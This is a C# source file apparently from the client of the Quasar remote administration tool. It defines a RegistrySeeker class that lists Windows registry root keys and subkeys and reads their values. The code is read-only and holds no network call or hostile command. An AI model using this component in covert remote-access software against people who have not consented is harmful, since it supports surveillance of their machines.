using Microsoft.Win32;
using Quasar.Client.Extensions;
using Quasar.Client.Helper;
using Quasar.Common.Models;
using System;
using System.Collections.Generic;

namespace Quasar.Client.Registry
{
    public class RegistrySeeker
    {
        /// <summary>
        /// The list containing the matches found during the search.
        /// </summary>
        private readonly List<RegSeekerMatch> _matches;

        public RegSeekerMatch[] Matches => _matches?.ToArray();

        public RegistrySeeker()
        {
            _matches = new List<RegSeekerMatch>();
        }

        public void BeginSeeking(string rootKeyName)
        {
            if (!String.IsNullOrEmpty(rootKeyName))
            {
                using(RegistryKey root = GetRootKey(rootKeyName))
                {
                    //Check if this is a root key or not
                    if (root != null && root.Name != rootKeyName)
                    {
                        //Must get the subKey name by removing root and '\'
                        string subKeyName = rootKeyName.Substring(root.Name.Length + 1);
                        using(RegistryKey subroot = root.OpenReadonlySubKeySafe(subKeyName))
                        {
                            if(subroot != null)
                                Seek(subroot);
                        } 
                    }
                    else
                    {
                        Seek(root);
                    }
                }
            }
            else
            {
                Seek(null);
            }
        }

        private void Seek(RegistryKey rootKey)
        {
            // Get root registrys
            if (rootKey == null)
            {
                foreach (RegistryKey key in GetRootKeys())
                    //Just need root key so process it
                    ProcessKey(key, key.Name);
            }
            else
            {
                //searching for subkeys to root key
                Search(rootKey);
            }
        }

        private void Search(RegistryKey rootKey)
        {
            foreach(string subKeyName in rootKey.GetSubKeyNames())
            {
                RegistryKey subKey = rootKey.OpenReadonlySubKeySafe(subKeyName);
                ProcessKey(subKey, subKeyName);
            }
        }

        private void ProcessKey(RegistryKey key, string keyName)
        {
            if (key != null)
            {
                List<RegValueData> values = new List<RegValueData>();

                foreach (string valueName in key.GetValueNames())
                {
                    RegistryValueKind valueType = key.GetValueKind(valueName);
                    object valueData = key.GetValue(valueName);
                    values.Add(RegistryKeyHelper.CreateRegValueData(valueName, valueType, valueData));
                }

                AddMatch(keyName, RegistryKeyHelper.AddDefaultValue(values), key.SubKeyCount);
            }
            else
            {
                AddMatch(keyName, RegistryKeyHelper.GetDefaultValues(), 0);
            }
        }

        private void AddMatch(string key, RegValueData[] values, int subkeycount)
        {
            RegSeekerMatch match = new RegSeekerMatch {Key = key, Data = values, HasSubKeys = subkeycount > 0};

            _matches.Add(match);
        }

        public static RegistryKey GetRootKey(string subkeyFullPath)
        {
            string[] path = subkeyFullPath.Split('\\');
            try
            {
                switch (path[0]) // <== root;
                {
                    case "HKEY_CLASSES_ROOT":
                        return RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64);
                    case "HKEY_CURRENT_USER":
                        return RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                    case "HKEY_LOCAL_MACHINE":
                        return RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                    case "HKEY_USERS":
                        return RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64);
                    case "HKEY_CURRENT_CONFIG":
                        return RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64);
                    default:
                        /* If none of the above then the key must be invalid */
                        throw new Exception("Invalid rootkey, could not be found.");
                }
            }
            catch (SystemException)
            {
                throw new Exception("Unable to open root registry key, you do not have the needed permissions.");
            }
            catch(Exception e)
            {
                throw e;
            }
        }

        public static List<RegistryKey> GetRootKeys()
        {
            List<RegistryKey> rootKeys = new List<RegistryKey>();
            try
            {
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64));
                rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64));
            }
            catch (SystemException)
            {
                throw new Exception("Could not open root registry keys, you may not have the needed permission");
            }
            catch (Exception e)
            {
                throw e;
            }

            return rootKeys;
        }
    }
}
